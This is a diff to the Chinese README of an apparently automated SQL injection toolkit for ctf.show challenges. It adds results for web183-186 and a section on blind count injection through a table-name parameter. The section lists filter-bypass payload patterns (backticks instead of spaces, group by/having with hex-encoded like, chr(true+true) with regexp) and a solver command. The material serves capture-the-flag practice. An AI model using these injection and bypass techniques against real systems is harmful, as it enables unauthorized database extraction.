@@ -242,6 +242,27 @@ python scripts/ctfshow_runner.py --run web181 web182 # 连续多题（自动处�
 | ctf.show web175 | 响应 data 永远清空 | 手工 `into outfile` | 写 `/var/www/html/flag.txt` 后读取，2 请求 |
 | ctf.show web179 | 无过滤，flag 行被 `username!='flag'` 排除 | `battle.py web179` | 恒真探针直接带回 flag，68 请求 / 7.6s |
 | ctf.show web180 | and/or/=/#/--/逗号/空格全滤 | `battle.py web180` | 减法布尔盲注，5147 请求 / 207s |
+| ctf.show web183 | 无 form、POST `tableName`、`select count(pass) from 表名` | `ctfshow_count_blind.py --url .../select-waf.php` | 反引号去空格 + like 前缀，0.6k 请求 |
+| ctf.show web184 | 引号、`=`、`where` 被滤 | `... --style having` | `group by pass having pass like 0x<hex>` |
+| ctf.show web185/186 | 数字、引号、反引号、`%` 被滤 | `... --style chr_regexp` | `chr(true+true+..)` 拼字符串 + `regexp()` |
+
+### 表名位置 / count 盲注（web183-web186 类题型）
+
+这几题没有常规回显位，注入点在**表名**位置：`select count(*) from ".$_POST['tableName']."`，
+响应只有 `$user_count = N;`。AutoSQLi 的 oracle 体系（union/报错/布尔）套不上，
+另有专用解题器 `scripts/ctfshow_count_blind.py`：把「前缀匹配」翻译成 count 查询，
+逐字符并发爆破（同一前缀下各候选字符互不影响，16 线程并发，每字符≈1 轮 RTT）。
+
+| style | 绕过方式 | 适用 |
+| --- | --- | --- |
+| `backtick` | `` `表`where`列`like"前缀%" `` | 空格被滤、引号可用（web183） |
+| `having` | `group by 列 having 列 like 0x<hex(前缀%)>` | 引号/`=`/`where` 被滤（web184） |
+| `chr_regexp` | `group by 列 having 列 regexp(concat(chr(true+true+..),...))` | 数字/引号/`%/反引号全被滤（web185/186） |
+
+```bash
+python scripts/ctfshow_count_blind.py --url "https://xxx.challenge.ctf.show/select-waf.php" \
+    --style chr_regexp
+```
 
 ### 形态自适应（WAF 感知核心）
 
